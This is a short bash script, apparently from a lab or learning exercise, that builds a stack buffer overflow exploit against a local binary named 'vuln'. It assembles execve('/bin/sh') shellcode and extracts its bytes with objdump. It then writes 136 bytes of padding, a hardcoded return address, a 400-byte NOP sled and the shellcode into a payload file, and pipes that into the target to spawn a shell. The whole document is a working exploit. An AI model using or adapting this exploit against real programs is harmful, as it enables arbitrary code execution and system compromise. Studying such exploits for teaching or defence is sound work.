#!/bin/bash

#compile our assembly
nasm -f elf64 -o shell.o ./shell.asm
ld -o shell ./shell.o
rm ./shell.o
#remove tmp file if exists
rm ./tmp.txt 2>/dev/null

#rip raw machine code from shell file and append to tmp text file
objcode=`objdump -d shell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$'`
for i in $objcode
do
  echo -n "\x$i" >> tmp.txt
done

#assign shellcode to a variable
shellcode=`cat ./tmp.txt`

#[RSP] at offset 136
#Junk to reach RSP, RIP + send to ./exploit
printf "%0.sA" {1..136} > ./exploit

#Changing address from RSP register to middle of nop sled + append to ./exploit
#0x7fffffffdf10
printf "%0.s\x80\xdf\xff\xff\xff\x7f\x00\x00" >> ./exploit

#NOP sled x 400 + append to ./exploit
printf "%0.s\x90" {1..400} >> ./exploit

#My shellcode
#\x48\x31\xdb\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
#\x53\x54\x5f\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05

#Append previously assigned shellcode to ./exploit
printf "%0.s$shellcode" >> ./exploit

#cleanup
rm ./tmp.txt 2>/dev/null
rm ./shell 2>/dev/null
cat ./exploit - | ./vuln
